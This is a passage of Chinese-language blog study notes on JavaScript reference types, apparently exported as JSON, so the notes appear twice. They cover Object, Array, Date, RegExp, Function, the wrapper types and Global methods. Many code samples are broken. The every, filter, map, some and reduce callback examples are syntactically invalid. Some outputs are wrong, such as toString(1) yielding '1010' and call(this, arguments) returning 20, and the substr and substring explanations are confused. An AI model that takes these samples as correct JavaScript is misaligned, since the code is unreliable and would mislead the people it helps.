class=\"headerlink\" title=\"RegExp类型\"></a>RegExp类型</h4><h5 id=\"实例属性\"><a href=\"#实例属性\" class=\"headerlink\" title=\"实例属性\"></a>实例属性</h5><table><thead><tr><th>方法</th><th>解释</th></tr></thead><tbody><tr><td>global</td><td>布尔值，表示是否设置了g</td></tr><tr><td>ignoreCase</td><td>布尔值，表示是否设置了i</td></tr><tr><td>lastIndex</td><td>整数，表示开始搜索下一个匹配的字符标志，从0算起</td></tr><tr><td>multiline</td><td>布尔值，表示是否设置了m标志</td></tr><tr><td>sorce</td><td>正则表达式的字符串表示</td></tr></tbody></table><h5 id=\"实例方法\"><a href=\"#实例方法\" class=\"headerlink\" title=\"实例方法\"></a>实例方法</h5><p>exec —接受一个参数，即要应用模式的字符串，然后返回包含一个匹配信息的数组，或者没有匹配返回null<br>test —接受一个字符串参数，在该模式下匹配成功返回true，否则返回false(只要存在即返回true)<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var text = &apos;cat, bat, sat, fat&apos;</span><br><span class=\"line\">var pattern = /.at/;</span><br><span class=\"line\">var matches = pattern.exec(text)    </span><br><span class=\"line\">matches[0]      //cat</span><br><span class=\"line\">matches.index   // 0</span><br><span class=\"line\">var text = &quot;456000-00-000123&quot;</span><br><span class=\"line\">var pattern = /\\d&#123;3&#125;-\\d&#123;2&#125;-\\d&#123;2&#125;/</span><br><span class=\"line\">pattern.test(text)      // true</span><br></pre></td></tr></table></figure><p></p><h4 id=\"Function类型\"><a href=\"#Function类型\" class=\"headerlink\" title=\"Function类型\"></a>Function类型</h4><p>每个函数都是Function类型的实例，而且都有与其他引用类型一样具有属性和方法。由于函数是对象，因此函数名实际上也是一个指向函数的指针，不会与某个函数绑定。<br>既然函数名是一个指针，所以JavaScript没有重载。<br><strong>ps：访问函数指针时，应该不加圆括号</strong></p><h5 id=\"函数表达式和函数声明\"><a href=\"#函数表达式和函数声明\" class=\"headerlink\" title=\"函数表达式和函数声明\"></a>函数表达式和函数声明</h5><p>由于JavaScript中有函数声明解析器，在所有函数执行前，会将函数声明提升至顶端。因此，函数表达式和函数声明会有一些区别<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sum1(10,11)     //21</span><br><span class=\"line\">function sum1(num1,num2)&#123;</span><br><span class=\"line\">    return num1+num2</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">sum2(10,12) //Uncaught TypeError: sum2 is not a function</span><br><span class=\"line\">var sum2 = function (num1,num2)&#123;</span><br><span class=\"line\">    return num1+num2</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>其他无明显差别</p><h5 id=\"callee-caller\"><a href=\"#callee-caller\" class=\"headerlink\" title=\"callee caller\"></a>callee caller</h5><p>callee被调用者<br>caller调用者<br>mdn不建议使用</p><h5 id=\"函数的属性和方法\"><a href=\"#函数的属性和方法\" class=\"headerlink\" title=\"函数的属性和方法\"></a>函数的属性和方法</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function F1(a,b)&#123;</span><br><span class=\"line\">    //</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function F2()&#123;</span><br><span class=\"line\">    //</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">F1.length // 2</span><br><span class=\"line\">F2.length // 0</span><br></pre></td></tr></table></figure><p>函数的length属性代表参数的个数</p><h5 id=\"call与apply\"><a href=\"#call与apply\" class=\"headerlink\" title=\"call与apply\"></a>call与apply</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function sum(num1,num2)&#123;</span><br><span class=\"line\">    return num1+num2</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function callSum(num1, num2)&#123;</span><br><span class=\"line\">    return sum.call(this,num1,num2)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">callSum(10,10)  //20</span><br><span class=\"line\">function sum(num1,num2)&#123;</span><br><span class=\"line\">    return num1+num2</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function callSum(num1, num2)&#123;</span><br><span class=\"line\">    return sum.call(this,arguments)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">callSum(10,10)  //20</span><br></pre></td></tr></table></figure><p>call和apply是两个非继承而来的方法，apply接受两个参数，一个是运行时函数的作用域，另一个是arguments对象或array实例；而call方法第一个参数是运行时函数作用域，其他参数是传入字面量。必须逐个列举出来<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">window.color = &apos;red&apos;</span><br><span class=\"line\">var o = &#123;</span><br><span class=\"line\">    color:&apos;green&apos;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function sayCOlor()&#123;</span><br><span class=\"line\">    console.log(this.color)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">sayCOlor.call(this)     //red</span><br><span class=\"line\">sayCOlor.call(window)   //red</span><br><span class=\"line\">sayCOlor.call(o)        //green</span><br></pre></td></tr></table></figure><p></p><p>call,apply的最大好处是让其扩充作用域，且实现松耦合</p><p>bind是创建一个实例，其this值会被绑定到传给bind函数的值<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">window.color = &apos;red&apos;</span><br><span class=\"line\">var o = &#123;</span><br><span class=\"line\">    color : &apos;blue&apos;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function sayColor()&#123;</span><br><span class=\"line\">    console.log(this.color)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var objectSayColor = sayColor.bind(o)</span><br><span class=\"line\">objectSayColor()    //blue</span><br></pre></td></tr></table></figure><p></p><h4 id=\"基本包装类型\"><a href=\"#基本包装类型\" class=\"headerlink\" title=\"基本包装类型\"></a>基本包装类型</h4><h5 id=\"Boolean类型\"><a href=\"#Boolean类型\" class=\"headerlink\" title=\"Boolean类型\"></a>Boolean类型</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var falseObject = new Boolean(false)</span><br><span class=\"line\">var result = falseObject  &amp;&amp; true</span><br><span class=\"line\">result // true</span><br><span class=\"line\">var falseValue = false</span><br><span class=\"line\">result = falseValue &amp;&amp; true</span><br><span class=\"line\">result // false</span><br><span class=\"line\">typeof falseObject  // object</span><br><span class=\"line\">typeof falseValue   // boolean</span><br><span class=\"line\">falseObject instanceof Boolean  //true</span><br><span class=\"line\">falseValue instanceof Boolean   //false</span><br></pre></td></tr></table></figure><p>基本类型布尔值与Boolean对象有一定差别，书上建议永远不要使用Boolean对象</p><h5 id=\"Number类型\"><a href=\"#Number类型\" class=\"headerlink\" title=\"Number类型\"></a>Number类型</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var numberObject = new Number(10)</span><br><span class=\"line\">numberObject    // Number &#123;[[PrimitiveValue]]: 10&#125;</span><br><span class=\"line\">numberObject.toString() // &quot;10&quot;</span><br><span class=\"line\">numberObject.valueOf()  // 10</span><br></pre></td></tr></table></figure><p>Number类型重写了valueOf(),toLocaleString(),toString()，重写后，valueOf返回基本类型值<br>基本类型的几个方法</p><p>1、toFixed // 有一个参数，代表保留几位小数<br>2、toExponential // 指数表示法，表示制定输出结果中小数位数<br>3、toPrecision // 接受一个参数，合理的调用toFixed和toExponential<br>4、toString // 接受一个参数，代表转换成几进制<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var num = 10</span><br><span class=\"line\">num.toString()  //10</span><br><span class=\"line\">num.toString(1)  //1010</span><br><span class=\"line\">num.toFixed(2)  //10.00</span><br><span class=\"line\">num.toExponential(1)  //1.0e+1</span><br><span class=\"line\">var nums = 99</span><br><span class=\"line\">num.toPrecision(1)  //1e+2</span><br><span class=\"line\">num.toPrecision(2)  // 99</span><br><span class=\"line\">num.toPrecision(3)  // 99.0</span><br></pre></td></tr></table></figure><p></p><h5 id=\"String类型\"><a href=\"#String类型\" class=\"headerlink\" title=\"String类型\"></a>String类型</h5><p>1、字符方法<br>charAt —以单个字符串的形式返回给定位置的字符<br>charCodeAt —以单个字符串的形式返回给定位置的字符编码<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var stringValue = &apos;hello world&apos;</span><br><span class=\"line\">stringValue.charAt(1)       // e</span><br><span class=\"line\">stringValue.charCodeAt(1)   // 101</span><br></pre></td></tr></table></figure><p></p><p>2、字符串方法<br>slice —接受两个参数，第一个是指定位置，第二个位结束位置，为负数从后往前切取<br>substr —接受两个参数，第一个是指定位置，第二个是结束位置，为负数从0往后开始<br>substring —接受两个参数，第一个是指定位置，第二个是字符个数，为负数从后往前切取<br>3、字符串位置<br>indexOf —接受两个参数，第一个是寻找字符，第二个是指定位置，默认从0开始往后<br>lastIndexOf —接受两个参数，第一个是寻找字符，第二个是指定位置，默认从后开始往前<br>4、trim<br>将字符串前后空格去除<br>5、大小写转换方法<br>toLowerCase //转换为小写<br>toUpperCase //转换为大写<br>toLocaleLowerCase<br>toLocaleUpperCase<br>6、replace<br>采用两个参数，第一个是匹配的正则表达式，第二个是替换内容<br>7、localeCompare方法<br>比较两个字符串，返回1,0，-1<br>8、fromCharCode方法<br>接受多个参数，将ASCII码转换成对应的字符</p><h5 id=\"单体内置对象\"><a href=\"#单体内置对象\" class=\"headerlink\" title=\"单体内置对象\"></a>单体内置对象</h5><p>1、Global对象<br>URI编码方法<br>(1)encodeURI，将空格转换成%20<br>(2)encodeURIComponent,将所有非字符转换成对应编码<br>(3)decodeURI，将encodeURI转换的uri反编码<br>(4)decodeURIComponent，将encodeURIComponent转换的uri反编码<br>2、eval方法<br>只接受一个参数，将字符串解析成JavaScript代码<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&apos;console.log(123)&apos;)  // 123</span><br></pre></td></tr></table></figure><p></p><h4 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h4><p>通过本章学习，有许多细致的方法以前没有使用过的现在很多都理解了。还有数组的存储，以前只是一个黑匣子对于我而言。现在能够认清它的本质，能对以后的代码优化有更好的帮助。</p>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"引用类型\"><a href=\"#引用类型\" class=\"headerlink\" title=\"引用类型\"></a>引用类型</h3><h4 id=\"Object类型\"><a href=\"#Object类型\" class=\"headerlink\" title=\"Object类型\"></a>Object类型</h4><p>1、JavaScript会将对象的属性自动转换成字符串<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var person = &#123;</span><br><span class=\"line\">    &quot;name&quot;:&apos;gdccwxx&apos;,</span><br><span class=\"line\">    &quot;age&quot;: 29,</span><br><span class=\"line\">    5:true</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">全等于</span><br><span class=\"line\">var person = &#123;</span><br><span class=\"line\">    &quot;name&quot;:&apos;gdccwxx&apos;,</span><br><span class=\"line\">    &quot;age&quot;: 29,</span><br><span class=\"line\">    &quot;5&quot;: true</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p><em>ps:最后一个属性后面是不添加逗号的，如果添加，在IE7即更早之前版本和Opera出现错误</em></p><p>2、两种访问对象的方法。</p><p>(1)在对象后面使用.来访问对象的属性<br>(2)使用[‘’]来访问对象的属性<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var person = &#123;</span><br><span class=\"line\">    &quot;name&quot;:&apos;gdccwxx&apos;,</span><br><span class=\"line\">    &quot;age&quot;: 29</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">person.name         // gdccwxx</span><br><span class=\"line\">person[&apos;name&apos;]      // gdccwxx</span><br></pre></td></tr></table></figure><p></p><p>第二种方法有好处，在对象的属性有空格的时候，只能用第二种</p><h4 id=\"Array类型\"><a href=\"#Array类型\" class=\"headerlink\" title=\"Array类型\"></a>Array类型</h4><p>数组是一组按序排列的值，相对地，对象的属性名称是无序的。从本质上讲，数组是按次序排列的一组值，数组是一种特殊的对象。<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var arr = [&apos;a&apos;, &apos;b&apos;, &apos;c&apos;];</span><br><span class=\"line\">Object.keys(arr);// [&quot;0&quot;, &quot;1&quot;, &quot;2&quot;]</span><br></pre></td></tr></table></figure><p></p><p>JavaScript的数据类型分为：值类型和引用类型(地址值)；而常见的引用类型有Object和Array／数组的存储模型中，如果是诸如Number,String之类的类型数据会被直接压入栈中，而引用类型只会压入对该值的一个索引（即C中所说的保存了数据的指针）。这些数据时储存在堆中的某块区间中，堆栈并不是独立的，栈中也可以在堆中存放。</p><h5 id=\"数组的创建\"><a href=\"#数组的创建\" class=\"headerlink\" title=\"数组的创建\"></a>数组的创建</h5><p>var arrayObj = new Array();　//创建一个数组<br>var arrayObj = new Array(size);　//创建一个数组并指定长度，注意不是上限，是长度<br>var arrayObj = new Array([element0[, element1[, …[, elementN]]]]);　//创建一个数组并赋值<br>var arrayObj = []</p><h5 id=\"数组的检测\"><a href=\"#数组的检测\" class=\"headerlink\" title=\"数组的检测\"></a>数组的检测</h5><p>value instanceof Array // true or false<br>Array.isArray(value) // true or false</p><h5 id=\"转换方法\"><a href=\"#转换方法\" class=\"headerlink\" title=\"转换方法\"></a>转换方法</h5><p>调用Array.prototype.toString()方法，将Array转换成字符串</p><h5 id=\"数组的几种操作方法\"><a href=\"#数组的几种操作方法\" class=\"headerlink\" title=\"数组的几种操作方法\"></a>数组的几种操作方法</h5><table><thead><tr><th>方法</th><th>解释</th></tr></thead><tbody><tr><td>shift</td><td>获取数组的第一项并返回，减少数组的length值</td></tr><tr><td>unshift</td><td>在数组前端添加任意个项并返回新数组的长度</td></tr><tr><td>pop</td><td>从数组某位移除最后一项，减少数组的length值</td></tr><tr><td>push</td><td>接受任意个参数，把他们逐个添加到数组末尾，病返回修改后数组的长度</td></tr><tr><td>reverse</td><td>不接受参数，将数组项的顺序翻转</td></tr><tr><td>sort</td><td>调用每个数组项的toString()转型方法，然后比较的到字符串，已确定如何重排，其返回值和reverse都是排序后的数组</td></tr><tr><td>concat</td><td>创建一个数组副本，将参数添加到副本之后。接受一个或多个参数，返回连接后的数组</td></tr><tr><td>slice</td><td>接受一个或两个参数，即要返回项的起始位置和结束位置，只有一个参数返回从指定位置到末尾项所有元项</td></tr><tr><td>splice</td><td>(1)删除：指定两个参数，要删除的第一项的位置和要删除的项数(2)插入：指定三个参数，起始位置，0(要删除的项数)和要插入的个项。如果要插入多项，则传入多个参数(3)替换：指定三个参数：起始位置、要删除的项数和要插入的任一项。插入和删除的项数不必相等</td></tr><tr><td>indexOf</td><td>从数组的开头位置(0)开始向后查找，没找到返回-1</td></tr><tr><td>lastIndexOf</td><td>从数组的最后位置(length-1)开始向前查找，没找到返回-1</td></tr><tr><td>every</td><td>对数组的每一项都运行给定函数，如果该数组的每一项都返回true，则返回true</td></tr><tr><td>filiter</td><td>对数组的每一项运行给定函数，返回该函数会返回true的项组成的数组</td></tr><tr><td>forEach</td><td>对数组的每一项运行给定的函数，这个方法没有返回值</td></tr><tr><td>map</td><td>对数组的每一项运行给定函数，返回每次函数调用的结果组成的数组</td></tr><tr><td>some</td><td>对数组中的每一项运行给定函数，任意一项返回true，则返回true</td></tr><tr><td>reduce</td><td>从数组的第一项开始，逐个遍历到最后</td></tr><tr><td>reduceRight</td><td>从数组的最后一项开始，逐个遍历到第一个</td></tr></tbody></table><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var color = [&apos;red&apos;,&apos;green&apos;]</span><br><span class=\"line\">// shift</span><br><span class=\"line\">var item1 = color.shift()</span><br><span class=\"line\">item1       // &apos;red&apos;   color = [&apos;green&apos;]   color.length = 1</span><br><span class=\"line\">// unshift</span><br><span class=\"line\">var item2 = color.unshift(&apos;red&apos;,&apos;blue&apos;)</span><br><span class=\"line\">item2       // 3    color = [&apos;red&apos;,&apos;blue&apos;,&apos;green&apos;]</span><br><span class=\"line\">// pop </span><br><span class=\"line\">var item3 = color.pop()</span><br><span class=\"line\">item3       // green    color=[&apos;red&apos;,&apos;blue&apos;] color.length = 2</span><br><span class=\"line\">// push</span><br><span class=\"line\">var item4 = color.push(&apos;gray&apos;)</span><br><span class=\"line\">item4       // 3    color = [&apos;red&apos;,&apos;blue&apos;,&apos;gray&apos;]   color.length = 3</span><br><span class=\"line\">// reverse</span><br><span class=\"line\">color.reverse() //color = [&apos;gray&apos;,&apos;blue&apos;,&apos;red&apos;]</span><br><span class=\"line\">// sort</span><br><span class=\"line\">function compare(value1,value2)&#123;</span><br><span class=\"line\">    if(value1 &lt; value2)&#123;</span><br><span class=\"line\">        return 1;</span><br><span class=\"line\">    &#125;else if(value1 &gt; value2)&#123;</span><br><span class=\"line\">        return -1</span><br><span class=\"line\">    &#125;else &#123;</span><br><span class=\"line\">        return 0</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">color.sort(compare)     //[&quot;red&quot;, &quot;gray&quot;, &quot;blue&quot;]</span><br><span class=\"line\">// concat</span><br><span class=\"line\">var color2 = color.concat(&apos;red&apos;)</span><br><span class=\"line\">color2      //[&quot;red&quot;, &quot;gray&quot;, &quot;blue&quot;, &quot;red&quot;]</span><br><span class=\"line\">// slice</span><br><span class=\"line\">var removed1 = color.slice(1)</span><br><span class=\"line\">var removed2 = color.slice(1,3)</span><br><span class=\"line\">removed1    // &quot;gray,blue,red&quot;</span><br><span class=\"line\">removed2    // &quot;gray,blue&quot;</span><br><span class=\"line\">// splice</span><br><span class=\"line\">var removed3 = color.splice(0,1)    // 删除第一项</span><br><span class=\"line\">removed3    // &apos;red&apos;</span><br><span class=\"line\">var removed4 = color.splice(1,0,&apos;origin&apos;,&apos;pink&apos;)    // 从位置1插入两项</span><br><span class=\"line\">removed4    // &apos;red,origin,pink,gray,blue,red&apos;</span><br><span class=\"line\">var removed5 = color.splice(1,1,&apos;purple&apos;)           // 插入一项，删除一项</span><br><span class=\"line\">removed5    // &apos;red,purple,blue,red&apos;</span><br><span class=\"line\">// indexOf</span><br><span class=\"line\">var item10 = color.indexOf(&apos;blue&apos;)</span><br><span class=\"line\">item10      // 2</span><br><span class=\"line\">// lastIndexOf</span><br><span class=\"line\">var item11 = color.indexOf(&apos;red&apos;)</span><br><span class=\"line\">item11      // 3</span><br><span class=\"line\">// every</span><br><span class=\"line\">var item12 = color.every(function(item, index, array))&#123;     //参数为item，迭代到的元素</span><br><span class=\"line\">    return item == &apos;red&apos;            // index,索引，array，数组本身</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">item12      // false</span><br><span class=\"line\">// filiter </span><br><span class=\"line\">var item13 = color.filiter(function(item,index,array))&#123;</span><br><span class=\"line\">    return (item == &apos;red&apos;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">item13      // red,red</span><br><span class=\"line\">// forEach </span><br><span class=\"line\">color.forEach(function(item,index,array))&#123;</span><br><span class=\"line\">    //执行某些操作</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// map</span><br><span class=\"line\">var item15 = color.map(function(item,index,array))&#123;</span><br><span class=\"line\">    return (&apos;color is &apos; +item)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">item15      // [&quot;color is red&quot;, &quot;color is gray&quot;, &quot;color is blue&quot;, &quot;color is red&quot;]</span><br><span class=\"line\">// some</span><br><span class=\"line\">var item16 = color.some(function(item, index, array))&#123;     //参数为item，迭代到的元素</span><br><span class=\"line\">    return item == &apos;red&apos;            // index,索引，array，数组本身</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">item16      // true</span><br><span class=\"line\">// reduce()</span><br><span class=\"line\">var item17 = color.reduce(function(prev,cur,index,array))&#123;</span><br><span class=\"line\">    return (prev + &apos; + &apos; cur)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">item17      // &quot;red + gray + blue + red&quot;</span><br><span class=\"line\">var item18 = color.reduceRight(function(prev,cur,index,array))&#123;</span><br><span class=\"line\">    return (prev + &apos; + &apos; cur)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">item18      // &quot;red + blue + gray + red&quot;</span><br></pre></td></tr></table></figure><h4 id=\"Date类型\"><a href=\"#Date类型\" class=\"headerlink\" title=\"Date类型\"></a>Date类型</h4><p>从国际时间1970年1月1日零时开始，可以精确到之后的100 000 000年</p><h5 id=\"toString-toLocaleString\"><a href=\"#toString-toLocaleString\" class=\"headerlink\" title=\"toString,toLocaleString\"></a>toString,toLocaleString</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var date = new Date()</span><br><span class=\"line\">date</span><br><span class=\"line\">Wed Jul 12 2017 15:39:22 GMT+0800 (CST)</span><br><span class=\"line\">date.toLocaleString()</span><br><span class=\"line\">&quot;7/12/2017, 3:39:22 PM&quot;</span><br><span class=\"line\">date.toString()</span><br><span class=\"line\">&quot;Wed Jul 12 2017 15:39:22 GMT+0800 (CST)&quot;</span><br></pre></td></tr></table></figure><p>如果是toString()，会直接返回标准的格式；<br>如果是toLocaleString()，先判断是否指定语言环境（locale），指定的话则返回当前语言环境下的格式设置（options）的格式化字符串；没有指定语言环境（locale），则返回一个使用默认语言环境和格式设置（options）的格式化字符串。</p><h5 id=\"日期格式的方法\"><a href=\"#日期格式的方法\" class=\"headerlink\" title=\"日期格式的方法\"></a>日期格式的方法</h5><table><thead><tr><th>方法</th><th>解释</th></tr></thead><tbody><tr><td>toDateString</td><td>特定显示的格式显示星期几，月，日，年</td></tr><tr><td>toTimeString</td><td>显示时，分，秒</td></tr><tr><td>toLocalDateString</td><td>显示地区的星期几，月，日，年</td></tr><tr><td>toLocalTimeString</td><td>显示地区的时，分，秒</td></tr><tr><td>toUTCString</td><td>显示完整格式的UTC日期</td></tr><tr><td>toLocaleString</td><td>区别如上</td></tr><tr><td>toString</td><td>区别如上</td></tr></tbody></table><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var date = new Date()</span><br><span class=\"line\">date.toDateString()</span><br><span class=\"line\">&quot;Wed Jul 12 2017&quot;</span><br><span class=\"line\">date.toTimeString()</span><br><span class=\"line\">&quot;15:49:48 GMT+0800 (CST)&quot;</span><br><span class=\"line\">date.toLocaleDateString()</span><br><span class=\"line\">&quot;7/12/2017&quot;</span><br><span class=\"line\">date.toLocaleTimeString()</span><br><span class=\"line\">&quot;3:49:48 PM&quot;</span><br><span class=\"line\">date.toUTCString()</span><br><span class=\"line\">&quot;Wed, 12 Jul 2017 07:49:48 GMT&quot;</span><br></pre></td></tr></table></figure><h4 id=\"RegExp类型\"><a href=\"#RegExp类型\" class=\"headerlink\" title=\"RegExp类型\"></a>RegExp类型</h4><h5 id=\"实例属性\"><a href=\"#实例属性\" class=\"headerlink\" title=\"实例属性\"></a>实例属性</h5><table><thead><tr><th>方法</th><th>解释</th></tr></thead><tbody><tr><td>global</td><td>布尔值，表示是否设置了g</td></tr><tr><td>ignoreCase</td><td>布尔值，表示是否设置了i</td></tr><tr><td>lastIndex</td><td>整数，表示开始搜索下一个匹配的字符标志，从0算起</td></tr><tr><td>multiline</td><td>布尔值，表示是否设置了m标志</td></tr><tr><td>sorce</td><td>正则表达式的字符串表示</td></tr></tbody></table><h5 id=\"实例方法\"><a href=\"#实例方法\" class=\"headerlink\" title=\"实例方法\"></a>实例方法</h5><p>exec —接受一个参数，即要应用模式的字符串，然后返回包含一个匹配信息的数组，或者没有匹配返回null<br>test 